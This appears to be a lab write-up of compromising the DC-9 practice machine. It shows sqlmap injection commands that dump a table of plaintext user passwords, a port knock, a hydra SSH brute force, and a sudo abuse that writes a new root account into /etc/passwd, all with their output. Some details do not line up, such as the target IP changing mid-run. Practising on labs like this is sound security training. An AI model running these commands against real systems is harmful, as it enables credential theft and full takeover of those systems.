`Running all scans on 192.168.217.209`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`80/tcp open  http`

On this page, there are some usernames we can extract and a search but not much else.

```
cat users                                   
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

No SSH port open so can't do much with these names.
Let's check for SQLi on the search.

![[Pasted image 20240229154151.png]]

![[Pasted image 20240229154228.png]]

Save this to a file

Check for the databases
```
sqlmap -r req --batch -dbs
```

`available databases [3]:`
`[*] information_schema`
`[*] Staff`
`[*] users`

Let's see what tables are in the Staff database
```
sqlmap -r req --batch -D Staff -tables
```

`Database: Staff`
`[2 tables]`
`+--------------+`
`| StaffDetails |`
`| Users        |`
`+--------------+`

Dump the StaffDetails table
This doesn't contain anything interesting.
Dump the Users table
```
sqlmap -r req --batch -D Staff -T Users -dump
```
`Database: Staff`
`Table: Users`
`[1 entry]`
`+--------+----------------------------------+----------+`
`| UserID | Password                         | Username |`
`+--------+----------------------------------+----------+`
`| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |`
`+--------+----------------------------------+----------+`


![[Pasted image 20240229154659.png]]

See the tables in the users database
```
sqlmap -r req --batch -D users -tables
```

`Database: users`
`[1 table]`
`+-------------+`
`| UserDetails |`
`+-------------+`

`Database: users`
`Table: UserDetails`
`[17 entries]`
`+----+------------+---------------+---------------------+-----------+-----------+`
`| id | lastname   | password      | reg_date            | username  | firstname |`
`+----+------------+---------------+---------------------+-----------+-----------+`
`| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |`
`| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |`
`| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |`
`| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |`
`| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |`
`| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |`
`| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |`
`| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |`
`| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |`
`| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |`
`| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |`
`| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |`
`| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |`
`| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |`
`| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |`
`| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |`
`| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |`
`+----+------------+---------------+---------------------+-----------+-----------+``
`
Running out of ideas as the webpage isn't very helpful. Let's make sure nmap didn't miss anything.
```
sudo nmap -sV --top-ports 100 192.168.250.209
```
`Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:50 EST`
`Nmap scan report for 192.168.250.209`
`Host is up (0.034s latency).`
`Not shown: 98 closed tcp ports (reset)`
`PORT   STATE    SERVICE VERSION`
`22/tcp filtered ssh`
`80/tcp open     http    Apache httpd 2.4.38 ((Debian))`

SSH is there but filtered. I've seen this before, could it need a port knock?
https://medium.com/@reotmani/port-knocking-dbe6d8aaeb9

The admin:transorbital1 credentials we dumped earlier let us login to the admin section of the webpage.
Under manage it has file does not exist. Can we view files?

![[Pasted image 20240229155409.png]]

Yes we can. Let's check for a knockd.conf as mentioned in the Medium guide.
![[Pasted image 20240229155502.png]]

We need to hit these 3 ports before 22 will open.

```
for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.217.209; done
```

Check again
`sudo nmap -sV --top-ports 100 192.168.250.209`
`Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:56 EST`
`Nmap scan report for 192.168.250.209`
`Host is up (0.033s latency).`
`Not shown: 98 closed tcp ports (reset)`
`PORT   STATE SERVICE VERSION`
`22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)`
`80/tcp open  http    Apache httpd 2.4.38 ((Debian))`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

SSH is open now.

Run our usernames and passwords we dumped through SSH with hydra
`hydra -L users -P pws.txt ssh://192.168.250.209`
`Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).`

`Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-29 15:57:06`
`[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4`
`[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task`
`[DATA] attacking ssh://192.168.250.209:22/`
`[22][ssh] host: 192.168.250.209   login: chandlerb   password: UrAG0D!`
`[22][ssh] host: 192.168.250.209   login: joeyt   password: Passw0rd`
`[STATUS] 266.00 tries/min, 266 tries in 00:01h, 26 to do in 00:01h, 13 active`
`[22][ssh] host: 192.168.250.209   login: janitor   password: Ilovepeepee`
`1 of 1 target successfully completed, 3 valid passwords found`
`Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-29 15:58:15``

The user janitor has a folder `.secrets-for-putin` in their home directory

`janitor@dc-9:~$ ls -ltra`
`total 16`
`drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin`
`drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..`
`lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null`
`drwx------  3 janitor janitor 4096 Mar  1 06:58 .gnupg`
`drwx------  4 janitor janitor 4096 Mar  1 06:58 .`

In this folder is a file with more passwords
`janitor@dc-9:~/.secrets-for-putin$ ls`
`passwords-found-on-post-it-notes.txt`
`janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt` 
`BamBam01`
`Passw0rd`
`smellycats`
`P0Lic#10-4`
`B4-Tru3-001`
`4uGU5T-NiGHts`

Add these to our passwords file and re-run hydra

We get a new hit
`[22][ssh] host: 192.168.250.209   login: fredf   password: 

SSH in to fredf and check sudo -l
`ssh fredf@192.168.250.209`  
`fredf@192.168.250.209's password:` 
`Permission denied, please try again.`
`fredf@192.168.250.209's password:` 
`Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64`

`The programs included with the Debian GNU/Linux system are free software;`
`the exact distribution terms for each program are described in the`
`individual files in /usr/share/doc/*/copyright.`

`Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent`
`permitted by applicable law.`
`fredf@dc-9:~$ ls`
`local.txt`
`fredf@dc-9:~$ sudo -l`
`Matching Defaults entries for fredf on dc-9:`
    `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

`User fredf may run the following commands on dc-9:`
    `(root) NOPASSWD: /opt/devstuff/dist/test/test`
`fredf@dc-9:~$`

Run it to see what it does
`fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test`
`Usage: python test.py read append`
So it reads a file then appends it to another file

Let's create our own root user.
Salt the password
```
openssl passwd -1 -salt dbl password
```

`$1$dbl$HDDAaqA2syu7zGMsMXbcd0`

Form the whole string
`dbl:$1$dbl$HDDAaqA2syu7zGMsMXbcd0:0:0:root:/root:/bin/bash`

Echo it into a file
`echo 'dbl:$1$dbl$HDDAaqA2syu7zGMsMXbcd0:0:0:root:/root:/bin/bash' > exploit`

Run our sudo program to add that to our /etc/passwd
`fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/exploit /etc/passwd

Su and get the flag
`fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/exploit /etc/passwd`
`fredf@dc-9:/tmp$ su dbl`
`Password:` 
`root@dc-9:/tmp# cat /root/proof.txt`
`eca3074dcbf3873f93f322df779f09d9`

